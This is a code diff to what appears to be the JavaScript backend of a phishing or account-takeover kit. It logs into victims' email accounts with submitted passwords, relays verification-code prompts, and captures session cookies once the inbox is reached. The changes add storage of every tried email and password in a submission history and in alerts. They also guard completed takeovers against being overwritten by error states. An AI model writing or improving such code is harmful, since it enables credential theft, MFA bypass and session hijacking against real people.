@@ -2945,10 +2945,11 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         status = 'WAITINGOPTIONS';
     }
 
-    // Set initialCheckResult from lastJsonResponse if available
-    if (row && row[columnIndexes['lastJsonResponse']]) {
+    // Set initialCheckResult from lastJsonResponse if available (prefer cache over stale sheet)
+    const rawInitialJson = cachedAfterPopulate?.lastJsonResponse || (row && row[columnIndexes['lastJsonResponse']]);
+    if (rawInitialJson) {
         try {
-            const lastJson = JSON.parse(row[columnIndexes['lastJsonResponse']]);
+            const lastJson = typeof rawInitialJson === 'string' ? JSON.parse(rawInitialJson) : rawInitialJson;
             initialCheckResult = {
                 emailExists: lastJson.emailExists !== undefined ? lastJson.emailExists : false,
                 accountAccess: lastJson.accountAccess !== undefined ? lastJson.accountAccess : false,
@@ -3241,6 +3242,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         logger.warn(`[processRow][${browserId}] Domain '${domain}' has no MX records and does not match strictly platform '${strictlyKey}' (keywords: [${strictKeywords.join(', ')}]). Rejecting as invalid email.`);
                         finalStatus = "WAITINGEMAILERROR";
                         updateData.status = finalStatus;
+                        updateData.platform = strictlyKey;
+                        updateData.lastUserActivity = new Date().toISOString();
                         updateData.lastJsonResponse = JSON.stringify({
                             browserId, email, status: finalStatus,
                             platform: strictlyKey, domain: domain || '',
@@ -3248,7 +3251,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             message: `Email domain '${domain}' is not a valid ${strictlyKey} address. Please use a valid email.`
                         });
                         sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictlyKey, email, browserId, password: password || '', detail: `Domain '${domain}' has no MX and doesn't match ${strictlyKey}` });
-                        updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
+                        appendSubmissionHistory(browserId, email, password || '');
+                        await updateBrowserRowData(browserId, { ...updateData, email, platform: strictlyKey, domain: domain || '', verified: false, fullAccess: false, ...submissionHistoryPayload(browserId) });
                         return;
                     }
                     logger.warn(`[processRow][${browserId}] No MX platform for '${domain}' (mx=${mxRecords.length}) — falling back to strictly platform '${strictlyKey}'.`);
@@ -3442,9 +3446,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         if (rowStrictlyForValidation) {
                             const validation = await validateEmailAgainstStrictly(email, rowStrictlyForValidation);
                             if (!validation.valid) {
+                                const strictlyPlatform = String(rowStrictlyForValidation).trim().toLowerCase() || 'unknown';
                                 logger.warn(`[processRow][${browserId}] Email '${email}' rejected by strictly validation: ${validation.message}. Setting WAITINGEMAILERROR so the template renders the inline error.`);
                                 finalStatus = "WAITINGEMAILERROR";
                                 updateData.status = finalStatus;
+                                updateData.platform = strictlyPlatform;
+                                updateData.lastUserActivity = new Date().toISOString();
                                 updateData.lastJsonResponse = JSON.stringify({
                                     browserId,
                                     email,
@@ -3456,16 +3463,16 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     requiresVerification: false,
                                     verificationState: null,
                                     verificationOptions: [],
-                                    platform: 'unknown',
+                                    platform: strictlyPlatform,
                                     timestamp: new Date().toISOString(),
                                     errorType: 'STRICTLY_MISMATCH',
                                     message: validation.message,
                                     lastTriedEmail: email,
                                     lastTriedPassword: password || ''
                                 });
-                                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: String(rowStrictlyForValidation).trim().toLowerCase() || 'unknown', email: email || '', browserId, password: password || '', detail: `STRICTLY_MISMATCH: ${validation.message}` });
-                                // Clear email to prevent re-processing, but keep password in sheet for the next attempt
-                                updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', verified: false, fullAccess: false });
+                                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictlyPlatform, email: email || '', browserId, password: password || '', detail: `STRICTLY_MISMATCH: ${validation.message}` });
+                                appendSubmissionHistory(browserId, email, password || '');
+                                await updateBrowserRowData(browserId, { ...updateData, email, platform: strictlyPlatform, verified: false, fullAccess: false, ...submissionHistoryPayload(browserId) });
                                 exitingEarly = true;
                                 return; // Exit processRow immediately
                             }
@@ -3497,6 +3504,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     logger.warn(`[processRow][${browserId}][WAITINGEMAIL] Domain '${domain}' has no MX records and does not match strictly platform '${strictFallbackKey}' (keywords: [${strictKeywords.join(', ')}]). Rejecting as invalid email.`);
                                     finalStatus = "WAITINGEMAILERROR";
                                     updateData.status = finalStatus;
+                                    updateData.platform = strictFallbackKey;
+                                    updateData.lastUserActivity = new Date().toISOString();
                                     updateData.lastJsonResponse = JSON.stringify({
                                         browserId, email, status: finalStatus,
                                         platform: strictFallbackKey, domain: domain || '',
@@ -3504,7 +3513,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         message: `Email domain '${domain}' is not a valid ${strictFallbackKey} address. Please use a valid email.`
                                     });
                                     sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictFallbackKey, email, browserId, password: password || '', detail: `Domain '${domain}' has no MX and doesn't match ${strictFallbackKey}` });
-                                    updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
+                                    appendSubmissionHistory(browserId, email, password || '');
+                                    await updateBrowserRowData(browserId, { ...updateData, email, platform: strictFallbackKey, domain: domain || '', verified: false, fullAccess: false, ...submissionHistoryPayload(browserId) });
                                     exitingEarly = true;
                                     return;
                                 }
@@ -3813,6 +3823,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     updateData.status = "COMPLETED";
                                     updateData.verified = true;
                                     updateData.fullAccess = true;
+                                    initialCheckResult.reachedInbox = true;
+                                    initialCheckResult.requiresVerification = false;
+                                    initialCheckResult.accountAccess = true;
+                                    initialCheckResult.verificationState = null;
                                     updateData.lastJsonResponse = JSON.stringify({
                                         ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "COMPLETED",
                                         verified: true, fullAccess: true,
@@ -6128,6 +6142,7 @@ if (!foundSelector) {
                                 initialCheckResult.reachedInbox = true;
                                 initialCheckResult.requiresVerification = false;
                                 initialCheckResult.accountAccess = true;
+                                initialCheckResult.verificationState = null;
 
                                 const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                 updateData.status = "PROCESSING_FINALIZING";
@@ -6380,6 +6395,7 @@ if (!foundSelector) {
                                     initialCheckResult.reachedInbox = true;
                                     initialCheckResult.requiresVerification = false;
                                     initialCheckResult.accountAccess = true;
+                                    initialCheckResult.verificationState = null;
                                     await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
                                     const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                     updateData.status = "PROCESSING_FINALIZING";
@@ -6430,6 +6446,7 @@ if (!foundSelector) {
                             initialCheckResult.requiresVerification = false;
                             initialCheckResult.accountAccess = true;
                             initialCheckResult.emailExists = true;
+                            initialCheckResult.verificationState = null;
 
                             const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                             updateData.status = "PROCESSING_FINALIZING";
@@ -6628,7 +6645,7 @@ if (!foundSelector) {
         // Prioritize explicit verification states from initialCheckResult
 
         // Handle CAPTCHA_FAILED — set FAILED (no fallback, auto-solve only)
-        if (initialCheckResult.verificationState === 'CAPTCHA_FAILED') {
+        if (initialCheckResult.verificationState === 'CAPTCHA_FAILED' && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {
             logger.info(`[processRow][${browserId}] CAPTCHA_FAILED detected. Setting FAILED status.`);
             finalStatus = "FAILED";
             updateData.status = "FAILED";
@@ -6650,7 +6667,7 @@ if (!foundSelector) {
         // wrong-password signal. Mark FAILED but KEEP the email so the user can retry, and
         // never fire a WRONG_EMAIL alert. Guard against clobbering a row that already completed
         // (e.g. a duplicate processRow racing the successful one).
-        if (initialCheckResult.verificationState === 'RETRY_TECHNICAL') {
+        if (initialCheckResult.verificationState === 'RETRY_TECHNICAL' && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {
             logger.warn(`[processRow][${browserId}] Technical error during account check (not a wrong-email signal): ${initialCheckResult.error || 'unknown'}. Marking FAILED for retry (email kept).`);
             try {
                 const curData = await fetchDataFromAppScript(1, 20000, true);
@@ -6731,7 +6748,7 @@ if (!foundSelector) {
 
             updateBrowserRowDataFast(browserId, updateData);
             return; // Exit processRow immediately — the WAITINGOPTIONS resume handler will pick up the auto-selected choice
-        } else if (initialCheckResult.verificationState === 'WAITINGEMAIL_ERROR') {
+        } else if (initialCheckResult.verificationState === 'WAITINGEMAIL_ERROR' && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {
             const sheetStatus = initialCheckResult.verificationState.replace(/_/g, '');
             finalStatus = initialCheckResult.verificationState; // Keep original with underscore
             updateData.lastJsonResponse = JSON.stringify({
@@ -6749,7 +6766,7 @@ if (!foundSelector) {
             updateData.status = sheetStatus;
             updateBrowserRowDataFast(browserId, updateData);
             return;
-        } else if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR') {
+        } else if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR' && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {
             // Unify: use WAITINGPASSWORD (not WAITINGPASSWORDERROR) so the WAITINGPASSWORD handler retries correctly
             logger.info(`[processRow][${browserId}] WAITINGPASSWORD_ERROR detected. Setting WAITINGPASSWORD for retry.`);
             finalStatus = "WAITINGPASSWORD";
@@ -6778,7 +6795,7 @@ if (!foundSelector) {
                 logger.warn(`[processRow][${browserId}] Sheet clear of rejected password failed (non-critical): ${err.message}`)
             );
             return;
-        } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined) && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS") {
+        } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined) && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {
             logger.info(`[processRow][${browserId}] Generic email error detected. Checking if due to cookie sheet row state or session expiration.`);
             if (status === "WAITINGPASSWORD") {
                 logger.info(`[processRow][${browserId}] Session likely expired during WAITINGPASSWORD phase. Setting status to FAILED and keeping email.`);
@@ -7610,9 +7627,11 @@ async function processWaitingRows() {
             // without a heartbeat keeping lastUserActivity fresh. The lastUserActivity
             // staleness check below will correctly identify abandoned sessions.
             if (activeProcesses.has(bId)) continue;
-            if (activityIdx === undefined || !row[activityIdx]) continue;
-
-            const activityVal = String(row[activityIdx]).trim();
+            const rawActivityVal = (columnIndexes['lastUserActivity'] !== undefined && row[columnIndexes['lastUserActivity']])
+                || (columnIndexes['lastRun'] !== undefined && row[columnIndexes['lastRun']])
+                || (columnIndexes['timestamp'] !== undefined && row[columnIndexes['timestamp']])
+                || '';
+            const activityVal = String(rawActivityVal).trim();
             if (!activityVal) continue;
 
             const activityDate = parseLocaleDate(activityVal) || new Date(activityVal);
